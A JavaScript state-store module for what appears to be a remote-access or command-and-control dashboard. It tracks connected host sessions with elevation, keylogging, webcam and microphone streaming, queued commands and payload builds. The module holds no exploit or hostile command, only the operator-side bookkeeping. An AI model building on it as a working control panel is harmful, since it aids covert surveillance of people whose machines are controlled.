/* Single source of truth + a coalesced change bus. */

import { presence, STATE_ORDER } from './format.js';

export const state = {
  sessions: new Map(),
  selected: null,
  checked: new Set(),
  filters: { q: '', state: 'all' },
  sort: 'state',
  route: { view: 'overview', id: null, tool: 'console' },
  events: [],
  unread: 0,
  conn: 'connecting',
  now: Date.now(),
  config: null,
  tools: null,
  stats: {},
  builds: [],
  me: null,
};

const subs = new Set();
export function subscribe(fn) { subs.add(fn); return () => subs.delete(fn); }

let scheduled = false;
export function emit() {
  if (scheduled) return;
  scheduled = true;
  requestAnimationFrame(() => { scheduled = false; subs.forEach((fn) => fn()); });
}

/* ---------- sessions ---------- */
export function upsert(s) {
  const prev = state.sessions.get(s.id);
  state.sessions.set(s.id, {
    ...(prev || {}), ...s,
    first_seen: prev?.first_seen || s.first_seen,
    keylog: { ...(prev?.keylog || {}), ...(s.keylog || {}) },
  });
  emit();
}

export function remove(id) {
  state.sessions.delete(id);
  state.checked.delete(id);
  if (state.selected === id) state.selected = null;
  emit();
}

export const get = (id) => state.sessions.get(id);

export function all(now = state.now) {
  const out = [];
  for (const s of state.sessions.values()) {
    s.presence = presence(s, now);
    out.push(s);
  }
  return out;
}

export function counts(now = state.now) {
  const c = { online: 0, idle: 0, stale: 0, offline: 0, elevated: 0, streaming: 0, queued: 0, keylogging: 0 };
  for (const s of state.sessions.values()) {
    c[presence(s, now)] += 1;
    if (s.host?.elevated) c.elevated += 1;
    if (s.streams?.cam || s.streams?.mic) c.streaming += 1;
    if (s.keylog?.on) c.keylogging += 1;
    c.queued += s.queued || 0;
  }
  c.total = state.sessions.size;
  return c;
}

export function visible() {
  const q = state.filters.q.trim().toLowerCase();
  const want = state.filters.state;
  let list = all();
  if (want !== 'all') list = list.filter((s) => s.presence === want);
  if (q) {
    list = list.filter((s) => [s.host?.hostname, s.host?.ip, s.host?.user, s.host?.os,
      s.remote, (s.tags || []).join(' '), s.note, s.id]
      .some((v) => String(v || '').toLowerCase().includes(q)));
  }
  const by = state.sort;
  list.sort((a, b) => {
    if (by === 'host') return String(a.host?.hostname || '').localeCompare(String(b.host?.hostname || ''));
    if (by === 'user') return String(a.host?.user || '').localeCompare(String(b.host?.user || ''));
    if (by === 'ip') return String(a.remote || a.host?.ip || '').localeCompare(String(b.remote || b.host?.ip || ''));
    if (by === 'seen') return (b.last_seen || 0) - (a.last_seen || 0);
    if (by === 'os') return String(a.host?.os || '').localeCompare(String(b.host?.os || ''));
    return STATE_ORDER[a.presence] - STATE_ORDER[b.presence]
      || (b.last_seen || 0) - (a.last_seen || 0);
  });
  return list;
}

/* ---------- activity ---------- */
export function log(kind, text, sid = null) {
  state.events.unshift({ id: Math.random().toString(36).slice(2), kind, text, sid, ts: Date.now() / 1000 });
  if (state.events.length > 400) state.events.length = 400;
  if (state.route.view !== 'activity') state.unread = Math.min(99, state.unread + 1);
  emit();
}

export const markRead = () => { state.unread = 0; emit(); };

/* ---------- misc ---------- */
export function select(id) { state.selected = id; emit(); }

export function toggleCheck(id, on) {
  if (on) state.checked.add(id); else state.checked.delete(id);
  emit();
}

export function setFilter(patch) { Object.assign(state.filters, patch); emit(); }
export function setConn(c) { state.conn = c; emit(); }
export function setRoute(r) { state.route = r; emit(); }
